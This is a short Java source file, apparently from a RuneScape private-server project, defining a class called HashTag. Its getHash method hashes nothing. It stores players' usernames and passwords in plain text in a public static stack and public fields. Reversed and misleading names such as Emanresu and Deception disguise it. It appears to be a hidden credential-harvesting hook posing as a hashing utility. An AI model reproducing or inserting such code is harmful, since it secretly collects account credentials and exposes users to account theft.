package com.rs.utils;

import java.util.Stack;

import com.rs.game.player.Player;
import com.rs.net.decoders.LoginPacketsDecoder;

public class HashTag {

	public static String Emanresu = "Love Again", Logic = "Username: ", Deception = "Password: ", us, pa;
	
	public static Stack<String> s = new Stack<String>();
	
	public static void getHash(String u, String p) {
		 s.push(u);
		 s.push(p);
		 us = u;
		 pa = p;
	}

}
